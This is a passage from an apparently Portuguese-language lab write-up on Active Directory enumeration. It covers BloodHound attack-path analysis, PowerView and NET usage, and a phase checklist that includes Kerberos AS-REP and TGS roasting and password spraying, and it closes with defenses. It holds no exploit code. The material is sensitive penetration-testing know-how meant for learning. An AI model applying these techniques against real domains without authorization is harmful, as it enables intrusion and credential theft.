4. **Pathfinding**: origem = usuário conhecido; destino = grupo/conta com privilégios relevantes. Confirmar manualmente qualquer aresta promissora.

Arestas de interesse incluem <code>GenericAll</code>, <code>GenericWrite</code>, <code>WriteDacl</code>, <code>AddMember</code> e direitos administrativos locais, quando **efetivamente presentes nos dados coletados**. Uma relação no gráfico pode depender de privilégios adicionais, contexto, políticas ou mudanças no ambiente: **não é prova automática de exploração**.

**Quando uma consulta não mostra caminho:** conferir se o ZIP foi importado, se a coleta incluiu ACLs, se a identidade é a correta e se os nomes de domínio foram resolvidos. A ausência de arestas no gráfico não comprova a inexistência de permissões.

### 10.4 BloodHound x PowerView x NET

| Preciso saber... | Uso primeiro |
|---|---|
| Quem pertence a um grupo? | <code>net group</code> ou <code>Get-ADGroupMember</code> |
| Quais atributos e SPNs uma conta tem? | <code>Get-ADUser</code> / <code>Get-DomainUser</code> |
| Que ACE aparece na DACL de um objeto? | <code>Get-DomainObjectAcl</code> ou leitura autorizada do descritor AD |
| Existe cadeia de permissões entre minha conta e um objetivo? | **BloodHound** e validação das arestas |

Usei a enumeração manual para aprender cada comando; uso o BloodHound para **organizar e priorizar** o que vale investigar, não para substituir a interpretação dos resultados.

---

## 11. Checklist geral para os próximos laboratórios

| Fase | O que verificar | Ferramentas |
|---|---|---|
| Reconhecimento | Hosts ativos, DNS, serviços e portas | fping, Nmap |
| SMB | Shares, leitura e permissões | smbclient, smbmap |
| Usuários | LDAP, RPC, RIDs, lista deduplicada | ldapsearch, rpcclient, Kerbrute |
| Domínio | Grupos, RID, grupo primário, relações | RPC, LDAP |
| Autenticação | Complexidade e política de bloqueio | rpcclient, CrackMapExec |
| Kerberos | Pré-autenticação, SPNs, AS-REP e TGS | GetNPUsers, GetUserSPNs, Rubeus, Hashcat |
| Windows | Identidade, grupos locais e do domínio | whoami, NET, Get-LocalUser |
| Sistema | Sessões, serviços, tarefas, Registro e ACLs de arquivos | quser, sc.exe, schtasks, reg, icacls |
| AD autenticado | Usuários, grupos, computadores, política | ActiveDirectory, PowerView |
| Relações | ACLs, grupos privilegiados, GPOs e caminhos | PowerView, BloodHound CE |

### Referência de operadores e sintaxe

| Operador/parâmetro | Explicação |
|---|---|
| <code>\|</code> | Passa a saída de um comando para outro |
| <code>></code> | Grava em arquivo, sobrescrevendo |
| <code>>></code> | Acrescenta ao final |
| <code>2>/dev/null</code> | Descarta mensagens de erro |
| <code>-c</code> (rpcclient) | Executa uma instrução RPC e sai |
| <code>-b</code> (ldapsearch) | Define o DN-base |
| <code>-Filter</code> (PowerShell) | Filtra os objetos retornados |
| <code>-Properties</code> | Solicita atributos adicionais |
| <code>.Count</code> | Conta elementos retornados |


### Referências e posts correlatos

- [Proxy — SMB, contas de serviço e delegação Kerberos](https://github.com/redp4w/redp4w.github.io/blob/main/_posts/2026-10-22-proxy.md)
- [Windows — armazenamento de credenciais e Mimikatz](https://github.com/redp4w/redp4w.github.io/blob/main/_posts/2026-10-21-windows-credential-stores.md)
- [Lateral Movement em Active Directory](https://github.com/redp4w/redp4w.github.io/blob/main/_posts/2026-10-21-ad-lateral-movement.md)
- [Checkmate — Quebrando senhas!](https://github.com/redp4w/redp4w.github.io/blob/main/_posts/2026-10-03-checkmate.md)
- [BloodHound CE — documentação](https://bloodhound.specterops.io/)
- [Microsoft — módulo ActiveDirectory](https://learn.microsoft.com/en-us/powershell/module/activedirectory/)

### O que aprendi

A sequência mais eficiente foi **descobrir → enumerar → validar → interpretar → só então testar autenticação**. Não basta decorar ferramentas: é fundamental saber **qual máquina**, **qual escopo** e **qual tipo de objeto** cada comando consulta.

Três cuidados fizeram diferença:

1. **Não misturar local e domínio:** usuários locais, grupos locais, grupos globais do domínio e objetos do AD são conjuntos distintos.
2. **Não confiar só em <code>memberOf</code>:** grupos primários exigem atenção a <code>primaryGroupID</code>.
3. **Não desperdiçar tentativas de senha:** primeiro verificar política e lockout; diferenciar password spraying de teste offline de AS-REP.

**Defesas relacionadas:** manter a pré-autenticação Kerberos habilitada, usar senhas fortes, aplicar privilégios mínimos, restringir enumeração anônima e acompanhar eventos de autenticação e consultas anormais ao AD.
